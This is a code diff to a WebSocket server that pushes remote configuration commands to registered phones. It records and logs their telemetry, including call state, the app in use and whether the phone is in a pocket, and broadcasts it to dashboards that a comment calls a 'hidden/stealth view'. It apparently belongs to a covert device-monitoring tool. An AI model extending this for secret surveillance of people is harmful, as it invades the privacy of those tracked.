@@ -96,6 +96,21 @@ function handleDeviceMessage(meta: DeviceSocketMeta, msg: any) {
         case 'register': {
             if (msg.client_id) {
                 registerDevice(msg.client_id, meta);
+                // Check if device has a saved remote configuration to sync
+                try {
+                    const savedConfig = db.getDeviceConfig(msg.client_id);
+                    if (savedConfig && meta.ws.readyState === WebSocket.OPEN) {
+                        meta.ws.send(JSON.stringify({
+                            type: 'command',
+                            command: 'UPDATE_CONFIG',
+                            config: savedConfig,
+                            timestamp: new Date().toISOString()
+                        }));
+                        console.log(`[ws] Synchronized saved remote config to ${msg.client_id}`);
+                    }
+                } catch (e) {
+                    console.error('[ws] Failed syncing config to device:', e);
+                }
                 if (msg.device_info) {
                     try {
                         const existing = db.getDeviceCommand(msg.client_id);
@@ -134,6 +149,7 @@ function handleDeviceMessage(meta: DeviceSocketMeta, msg: any) {
                 const callApp = msg.call_app;
                 const callPkg = msg.call_pkg;
                 const callCode = msg.call_code;
+                const ecoMode = msg.eco_mode === true || msg.eco_mode === 1;
 
                 let routeStr = '';
                 if (route === 'JCK') routeStr = ' | 🎧 Jack';
@@ -164,8 +180,9 @@ function handleDeviceMessage(meta: DeviceSocketMeta, msg: any) {
                 let postureStr = posture === 'POCK' ? ' | 👖 Pocket' : (posture === 'DESK' ? ' | 🪵 Desk' : (posture === 'OPEN' ? ' | ✋ Hand' : ''));
                 let callStr = (callCode && callCode !== 'AIDLE') ? ` | 📞 ${callApp || 'Call'} (${callCode})` : '';
                 let activeStr = (callPkg && (screenOn === true || screenOn === 1)) ? ` | 📱 Using: ${callPkg}` : '';
+                let ecoStr = ecoMode ? ' | ⚡ Eco Mode (Sensors Off)' : '';
 
-                const telemetrySummary = `🔋 ${battery}% | 💾 ${storageMb}MB free${routeStr}${screenStr}${powerStr}${ringerStr}${audioStr}${tempStr}${motionStr}${postureStr}${callStr}${activeStr}`;
+                const telemetrySummary = `🔋 ${battery}% | 💾 ${storageMb}MB free${routeStr}${screenStr}${powerStr}${ringerStr}${audioStr}${tempStr}${motionStr}${postureStr}${callStr}${activeStr}${ecoStr}`;
                 console.log(`[ws] Telemetry from ${clientId}: ${telemetrySummary}`);
 
                 // Broadcast live telemetry to connected dashboards (e.g. hidden/stealth view)
@@ -187,6 +204,7 @@ function handleDeviceMessage(meta: DeviceSocketMeta, msg: any) {
                     callApp,
                     callPkg,
                     callCode,
+                    ecoMode,
                     timestamp: new Date().toISOString()
                 });
             }
